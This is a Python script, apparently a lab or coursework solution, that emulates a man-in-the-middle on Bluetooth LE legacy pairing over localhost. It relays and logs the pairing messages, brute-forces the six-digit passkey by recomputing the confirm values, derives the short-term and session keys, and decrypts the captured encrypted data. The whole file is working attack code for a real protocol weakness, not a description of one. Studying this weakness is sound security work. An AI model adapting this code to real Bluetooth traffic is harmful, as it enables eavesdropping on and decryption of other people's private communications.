#!/usr/bin/env python3
import logging
from pwn import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from toolbox import *

# Create and configure logger
logger = logging.getLogger('attacker')
logger.setLevel(logging.DEBUG)  # Logger level

# Create console handler for INFO level
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(console_handler)


iat = b'\x00'
rat = b'\x00'

def attack(MAC_init, MAC_rsp, pair_req, pair_rsp, confirm_init, confirm_rsp, rand_init, rand_rsp, ivskd_c, ivskd_p, encrypted_data):
    #TODO: implement attack and output the LTK to screen
    for passkey in range(1000000):  # Iterate from 000000 to 999999
        # Convert passkey to 128-bit TK (Temporary Key)
        tk = int.to_bytes(passkey, 16, byteorder='little')

        # Recompute LP_CONFIRM_I and LP_CONFIRM_R using c1()
        recomputed_confirm_i = c1(tk, rand_init[1:], pair_req, pair_rsp, b'\x00',MAC_init, b'\x00', MAC_rsp)
        recomputed_confirm_r = c1(tk, rand_rsp[1:], pair_req, pair_rsp, b'\x00',MAC_init, b'\x00', MAC_rsp)

        # Check if the recomputed confirms match the sniffed ones
        if recomputed_confirm_r == confirm_rsp[1:] and recomputed_confirm_i == confirm_init[1:]:
            print(f"[SUCCESS] Found the passkey: {passkey:06d}")
            # Derive the Short-Term Key (STK)
            stk = s1(tk, rand_init[1:], rand_rsp[1:])
            print(f"Derived STK: {stk.hex()}")

            # Derive the Session Key
            skd_c = ivskd_c[4:]  # Last 8 bytes of ivskd_c
            skd_p = ivskd_p[4:]  # Last 8 bytes of ivskd_p

            session_key = derive_session_key(skd_p, skd_c, stk)
            print(f"Derived Session Key: {session_key.hex()}")

            iv = ivskd_p[:4] + ivskd_c[:4]   # Combine IV_p and IV_c
            cipher = AES.new(session_key, AES.MODE_CCM, nonce=iv, mac_len=4)
            encrypted_data_solve = encrypted_data[1:]
            ciphertext = encrypted_data_solve[:-4]
            mac = encrypted_data_solve[-4:]
            try:
                decrypted_data = cipher.decrypt_and_verify(ciphertext,mac)
                logger.info(f'Decrypted data: {decrypted_data.hex()}')
            except ValueError as e:
                logger.error(f'Failed to decrypt data: {e}')


def sniff():
    # Attacker acts as the middle man, she can sniff all the data between the initiator and the responder
    # To emulate this, the attacker connects to the responder and the initiator to relay the data between them.
    responder_host = '127.0.0.1'
    responder_port = 65432
    rsp_conn = remote(responder_host, responder_port)

    initiator_host = '127.0.0.1'
    initiator_port = 65433
    server = listen(initiator_port, bindaddr=initiator_host)
    init_conn = server.wait_for_connection()

    # relay MAC address
    MAC_init = init_conn.recv()
    rsp_conn.send(MAC_init)
    logger.info(f'Sniffed initiator MAC: {MAC_init.hex()}')
    MAC_rsp = rsp_conn.recv()
    init_conn.send(MAC_rsp)
    logger.info(f'Sniffed responder MAC: {MAC_rsp.hex()}')

    # relay pairing request
    pair_req = init_conn.recv()
    rsp_conn.send(pair_req)
    logger.info(f'Sniffed pairing request: {pair_req.hex()}')

    # relay pairing response
    pair_rsp = rsp_conn.recv()
    init_conn.send(pair_rsp)
    logger.info(f'Sniffed pairing response: {pair_rsp.hex()}')

    # relay confirm value
    confirm_init = init_conn.recv()
    rsp_conn.send(confirm_init)
    logger.info(f'Sniffed initiator confirm value: {confirm_init.hex()}')

    confirm_rsp = rsp_conn.recv()
    init_conn.send(confirm_rsp)
    logger.info(f'Sniffed responder confirm value: {confirm_rsp.hex()}')

    # relay random value
    rand_init = init_conn.recv()
    rsp_conn.send(rand_init)
    logger.info(f'Sniffed initiator random value: {rand_init.hex()}')

    rand_rsp = rsp_conn.recv()
    init_conn.send(rand_rsp)
    logger.info(f'Sniffed responder random value: {rand_rsp.hex()}')

    # relay ivskd_c
    ivskd_c = init_conn.recv()
    rsp_conn.send(ivskd_c)
    logger.info(f'Sniffed initiator ivskd_c: {ivskd_c.hex()}')

    ivskd_p = rsp_conn.recv()
    init_conn.send(ivskd_p)
    logger.info(f'Sniffed responder ivskd_p: {ivskd_p.hex()}')

    # relay encrypted data
    encrypted_data = init_conn.recv()
    rsp_conn.send(encrypted_data)
    logger.info(f'Sniffed encrypted data: {encrypted_data.hex()}')

    attack(MAC_init, MAC_rsp, pair_req, pair_rsp, confirm_init, confirm_rsp, rand_init, rand_rsp, ivskd_c, ivskd_p, encrypted_data)

if __name__ == "__main__":
    sniff()